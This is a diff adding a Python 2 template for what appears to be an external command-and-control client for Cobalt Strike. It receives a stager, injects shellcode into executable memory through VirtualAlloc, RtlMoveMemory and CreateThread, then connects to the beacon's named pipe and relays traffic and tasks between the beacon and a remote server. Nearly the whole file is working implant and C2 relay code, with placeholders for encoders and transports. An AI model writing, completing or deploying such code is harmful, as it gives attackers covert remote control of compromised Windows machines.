+++ skeletons/frameworks/cobalt_strike/client/clientcore/full_clientcore.py
@@ -1,0 +1,141 @@
+from ctypes import *
+from ctypes.wintypes import *
+import struct
+from sys import exit
+from time import sleep
+
+# <encoder imports>
+
+# </encoder imports>
+
+
+# <transport imports>
+
+# </transport imports>
+
+
+# <configurations>
+# ```[var:::client_consts]```
+# </configurations>
+
+
+# <encoder functions>
+```[var:::encoder_code]```
+# </encoder functions>
+
+
+# <transport functions>
+```[var:::transport_code]```
+# </transport functions>
+
+# Client core
+C2_BLOCK_TIME = int(```[var:::c2_block_time]```)
+
+def start_beacon(payload):
+    shellcode =  bytearray(payload)
+    buf = (c_char * len(shellcode)).from_buffer(shellcode)
+    ptr = windll.kernel32.VirtualAlloc(c_int(0),
+                                       c_int(len(shellcode)),
+                                       c_int(0x3000), # MEM_COMMIT
+                                       c_int(0x40)) # PAGE_EXECUTE_READWRITE
+    
+    windll.kernel32.RtlMoveMemory(c_int(ptr), buf, c_int(len(shellcode)))
+    windll.kernel32.CreateThread(None, c_int(0), c_int(ptr), None, c_int(0), None)
+
+# Open the handle to the pipe
+def open_handle():
+    GENERIC_READ = 0x80000000
+    GENERIC_WRITE = 0x40000000
+    OPEN_EXISTING = 0x3
+    SECURITY_SQOS_PRESENT = 0x100000
+    SECURITY_ANONYMOUS = 0x0
+    while 1:
+        pipe_handle = windll.kernel32.CreateFileA(```[var:::c2_pipe_name]```,
+                                                  GENERIC_READ|GENERIC_WRITE,
+                                                  c_int(0),
+                                                  None,
+                                                  OPEN_EXISTING,
+                                                  SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS,
+                                                  None)
+        if pipe_handle != -1:
+            break
+    return pipe_handle
+
+
+def read_frame(handle):
+    print "Handle is: %s" % (str(handle))
+    result, size = win32file.ReadFile(handle, 4, None)
+    size = struct.unpack('<I', size)[0]
+    result, chunk = win32file.ReadFile(handle, size, None)
+    return chunk
+
+def ReadPipe(handle):
+    return read_frame(handle)
+
+def write_frame(handle, chunk):
+    wrote = c_int(0)
+    chunklen = len(chunk)
+    chunklen = struct.pack('<I', chunklen)
+    win32file.WriteFile(handle, chunklen, None)
+    win32file.WriteFile(handle, chunk, None)
+    return 0
+
+
+def WritePipe(handle,chunk):
+    print "Writing to pipe: %s" %(chunk)
+    return write_frame(handle, chunk)
+
+def go():
+    print "Waiting for stager..."
+    p = recvData()
+    print "Got a stager! loading..."
+    sleep(2)
+    # Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
+    beacon_thread = start_beacon(p)
+    handle_beacon = open_handle()
+    # Grabbing and relaying the metadata from the SMB pipe is done during interact()
+    print "Loaded, and got handle to beacon. Getting METADATA."
+
+    return handle_beacon
+
+def interact(handle_beacon):
+    try:
+        while(True):
+            
+            # LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
+            chunk = ReadPipe(handle_beacon)
+            if chunk < 0:
+                print 'readpipe %d' % (len(chunk))
+                break
+            else:
+                print "Received %d bytes from pipe" % (len(chunk))
+            print "relaying chunk to server"
+            sendData(chunk)
+
+            # LOGIC TO CHECK FOR A NEW TASK
+            print "Checking for new tasks from transport"
+            
+            newTask = recvData()
+
+            print "Got new task: %s" % (newTask)
+            print "Writing %s bytes to pipe" % (len(newTask))
+            r = WritePipe(handle_beacon, newTask)
+            print "Wrote %s bytes to pipe" % (r)
+            sleep(C2_BLOCK_TIME/100)
+    except KeyboardInterrupt:
+        print "Caught escape signal"
+        sys.exit(0)
+
+
+# Prepare the transport module
+prepTransport()
+
+#Get and inject the stager
+handle_beacon = go()
+
+# Run the main loop, keyboard escape available for debugging
+try:
+    interact(handle_beacon)
+except KeyboardInterrupt:
+    print "Caught escape signal"
+    exit(0)
